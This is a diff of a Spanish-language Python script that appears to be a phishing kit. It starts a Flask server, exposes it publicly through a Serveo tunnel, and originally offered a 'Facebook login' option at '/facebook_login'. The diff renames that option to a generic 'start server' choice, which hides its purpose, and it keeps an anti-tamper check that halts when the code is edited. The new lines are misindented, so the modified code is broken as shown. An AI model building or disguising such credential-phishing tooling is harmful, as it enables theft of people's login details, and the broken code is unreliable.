@@ -13,7 +13,12 @@ def verificar_integridad():
         contenido = f.read()
         hash_actual = hashlib.sha256(contenido).hexdigest()
     if hash_actual != hash_original:
-        print("")
+        # Mostrar el contenido de copyright.txt
+        if os.path.exists('copyright.txt'):
+            with open('copyright.txt', 'r') as f:
+                print(f.read())
+        else:
+            print("Este código ha sido modificado de forma no autorizada.")
         sys.exit()
 
 # Verificar la integridad del código antes de continuar
@@ -247,7 +252,7 @@ def start_serveo():
 
 def main():
     unique_id = generate_unique_id()  # Genera un UUID único
-    
+
     # Banner en color rojo
     banner = '''
 \033[95m  _________  _   _ ____   ___ __________ ____   
@@ -255,39 +260,34 @@ def main():
    / /| |_) | |_| | | | | | | |/ /|  _| | |_) | 
   / /_|  __/|  _  | |_| | |_| / /_| |___|  _ <  
  /____|_|   |_| |_|____/ \___/____|_____|_| \_\ 
-                                                 \033[95m
+                                              \033[95m
     '''
     print(banner)
 
-    # Mostrar menú para elegir opción
-    print("\nMarca 1 para elegir la primera opción.")
-    print("1: Facebook login")
+    # Mostrar menú para selección de opciones
+       print("\nOpciones:")
+       print("1: Iniciar servidor")
+       print("2: Salir")
 
-    choice = input("\nSelecciona una opción: ")
+       opcion = input("Elige una opción (1/2): ").strip()
 
-    if choice == '1':
-        print("\033[1;31mHas elegido la opción: Facebook login.")
-        create_css()
-        
-        # Ejecutar el servidor Flask en un hilo separado
-        server_thread = threading.Thread(target=run_server)
-        server_thread.start()
+       if opcion == '1':
+           create_css()  # Crear archivo CSS
+           server_thread = threading.Thread(target=run_server)
+           server_thread.daemon = True
+           server_thread.start()
+           print("Servidor en ejecución en http://localhost:5001")
+           url_serveo = start_serveo()
+           if url_serveo:
+               print(f"Tu servidor está disponible en: {url_serveo}")
+           else:
+               print("No se pudo obtener la URL de Serveo.")
+           input("Presiona Enter para salir...")
+       elif opcion == '2':
+           print("Saliendo...")
+           sys.exit()
+       else:
+           print("Opción inválida. Inténtalo de nuevo.")
 
-        # Ejecutar Serveo
-        url = start_serveo()
-
-        # Mostrar la URL pública con la opción elegida
-        if url:
-            print(f"URL pública: {url}/facebook_login")
-        else:
-            print("No se pudo obtener la URL de Serveo.")
-
-        # Esperar a que el servidor finalice
-        server_thread.join()
-
-    else:
-        print("Opción no válida. Saliendo.")
-        exit()
-
-if __name__ == '__main__':
-    main()
+   if __name__ == '__main__':
+       main()
